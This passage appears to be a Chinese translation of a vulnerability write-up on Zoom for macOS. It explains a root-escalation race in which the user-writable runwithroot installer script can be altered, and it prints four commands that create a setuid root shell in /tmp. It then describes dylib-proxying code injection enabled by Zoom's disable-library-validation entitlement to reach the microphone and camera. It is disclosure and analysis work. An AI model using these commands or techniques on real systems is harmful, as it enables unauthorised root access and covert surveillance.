        "ppid" : 1876,
        "ancestors" : [
          1876,
          1823,
          1820,
          1
        ],
        "signing info" : {
          "csFlags" : 603996161,
          "signatureIdentifier" : "com.apple.sh",
          "cdHash" : "D3308664AA7E12DF271DC78A7AE61F27ADA63BD6",
          "isPlatformBinary" : 1
        },
        "path" : "/bin/sh",
        "pid" : 1882
      },
      "timestamp" : "2020-03-31 03:18:45 +0000"
    }
runwithroot脚本的内容无关紧要。重要的是，本地无特权的攻击者（或是恶意软件片段）可以在以root用户身份执行脚本之前修改该脚本吗？（再次提醒，AuthorizationExecuteWithPrivileges
API不会验证正在执行的内容）
答案是显而易见的：是可以修改的。
我们可以通过一个事实来确认这一点。那就是在安装过程中我们可以注意到macOS安装程序（处理.pkgs）会将runwithroot脚本复制到用户可写的临时目录中：
    tester@users-Mac T % pwd      
    /private/var/folders/v5/s530008n11dbm2n2pgzxkk700000gp/T
    tester@users-Mac T % ls -lart com.apple.install.v43Mcm4r
    total 27224
    -rwxr-xr-x   1 tester  staff     70896 Mar 23 02:25 zoomAutenticationTool
    -rw-r--r--   1 tester  staff       513 Mar 23 02:25 zoom.entitlements
    -rw-r--r--   1 tester  staff  12008512 Mar 23 02:25 zm.7z
    -rwxr-xr-x   1 tester  staff       448 Mar 23 02:25 runwithroot
    ...
看上去我们应该可以获取到root权限~
如下图所示，利用这种类型的漏洞获取权限的做法是十分可靠的（尽管需要一些耐心，因为您必须等待安装程序或更新程序的运行！）：  
为了利用Zoom的这一漏洞，本地非特权攻击者可以在安装（或升级）期间简单地替换或修改runwithroot脚本来获得root用户访问权限。
例如，我们可以向runwithroot脚本中添加以下命令来弹root shell：
    1 cp /bin/ksh /tmp
    2 chown root:wheel /tmp/ksh
    3 chmod u+s /tmp/ksh
    4 open /tmp/ksh
效果图如下：  
## Zoom本地安全漏洞#2 获取麦克风与摄像头权限的代码注入
Zoom软件的使用毋庸置疑需要系统麦克风与摄像头的权限。
在最新版本的macOS上，这种权限的申请需要明确的用户批准。（从安全与隐私的角度来看是一件好事）：  
然而，Zoom对此具有（出于我所不知道的原因）特殊的“排除项”，该“排除项”允许攻击者将恶意代码注入其进程空间中，使恶意代码拥有了Zoom的（麦克风和摄像头）访问权限！这给攻击者提供了一种记录受害者Zoom会议的方法，更糟糕的是，它甚至可以在任意时间（没有用户访问提示）访问麦克风和摄像头！
现代macOS程序在编译过程中引入了一个叫做[Hardened
Runtime](https://developer.apple.com/documentation/security/hardened_runtime)的特性。Apple官方对这一增强安全的特性描述如下：
_Hardened Runtime_ 与系统完整性保护(System Integrity Protection,
SIP)一起，通过防止某些类型的漏洞(如代码注入、动态链接库(DLL)劫持和进程内存空间篡改)来保护软件运行时的完整性。
苹果公司参加了2016年在莫斯科举行的[ZeroNights](https://twitter.com/ZeroNights)大会，我在会议上注意到该功能将对macOS的安全起到很大作用：  
我们可以通过codesign工具检查Zoom（或其他任何应用程序）是否已使用“ Hardened Runtime”进行有效签名和编译。
    $ codesign -dvvv /Applications/zoom.us.app/
    Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
    Identifier=us.zoom.xos
    Format=app bundle with Mach-O thin (x86_64)
    CodeDirectory v=20500 size=663 flags=0x10000(runtime) hashes=12+5 location=embedded
    ...
    Authority=Developer ID Application: Zoom Video Communications, Inc. (BJ4HAAB9B3)
    Authority=Developer ID Certification Authority
    Authority=Apple Root CA
flags值为0x10000（runtime）表示应用程序是使用“ Hardened
Runtime”选项编译的。因此，运行时应由macOS对此应用程序强制执行。
到目前为止都很好！正确地实施Hardened Runtime会阻止代码注入等这一类型的攻击。
然而，我终究还是发现了Zoom在实现这一特性上的问题😅。
我们再次通过codesign工具dump出Zoom的entitlements（entitlements是代码签名后的功能或异常）。
    codesign -d --entitlements :- /Applications/zoom.us.app/
    Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
      com.apple.security.automation.apple-events
      com.apple.security.device.audio-input
      com.apple.security.device.camera
      com.apple.security.cs.disable-library-validation
      com.apple.security.cs.disable-executable-page-protection
由于Zoom需要(用户批准的)麦克风和摄像头访问权限，因此需要com.apple.security.device.audio-input和com.apple.security.device.camera这俩个entitlements 。
然而com.apple.security.cs.disable-library-validation这一entitlement非常有趣，简单来说，它的功能就是告诉macOS，我既想要 _“Hardened Runtime”_
，又想允许任何库加载到我的地址空间中。换句话说代码注入是可行的了！
Apple官方有关于此entitlement的介绍：  
因此，由于这种entitlement的存在，我们(理论上)可以绕过“Hardened
Runtime”，并将恶意库代码注入Zoom中(例如，在没有访问警告的情况下访问麦克风和摄像头)。
有多种方法可以强制远程进程在加载或运行时加载动态库。这里我们将重点介绍一叫做`dylib
proxying`的方法，这种方法既隐蔽又持久，深受恶意软件作者喜爱。
`dylib
proxying`，简而言之就是我们替换了目标（即Zoom）所依赖的合法库文件，然后将Zoom发出的所有请求代理回原始库文件，以确保程序功能正常使用。
`dylib
proxying`的另一个好处是它不会损害二进制文件的代码签名证书（但是，它可能会影响程序集的签名）。从而Apple在运行时进行的签名检查(如对麦克风和摄像头的访问)不会检测到恶意库文件，因此仍然可以保持对麦克风和摄像头的访问权限。
这是我在漏洞利用中经常使用的一种方法，例如（以前）绕过SIP：  
如图所示，攻击者可以代理IASUtilities库，这样macOS动态链接器(dyld)就会自动将恶意代码加载(“注入”)到Apple的安装器中(SIP绕过攻击的先决条件)。
回到Zoom的问题上，我们将以类似的方法代理一个库(Zoom需要的)，使得恶意库文件在启动时可以自动加载到Zoom的可信进程地址空间。
为了确定Zoom在运行时链接了哪些库，我们可以通过macOS动态加载程序自动加载Zoom，之后使用otool工具通过L参数将其显示出来：
    $ otool -L /Applications/zoom.us.app/Contents/MacOS/zoom.us 
    /Applications/zoom.us.app/Contents/MacOS/zoom.us:
      @rpath/curl64.framework/Versions/A/curl64
      /System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa
      /System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
      /usr/lib/libobjc.A.dylib
      /usr/lib/libc++.1.dylib
      /usr/lib/libSystem.B.dylib
      /System/Library/Frameworks/AppKit.framework/Versions/C/AppKit
      /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation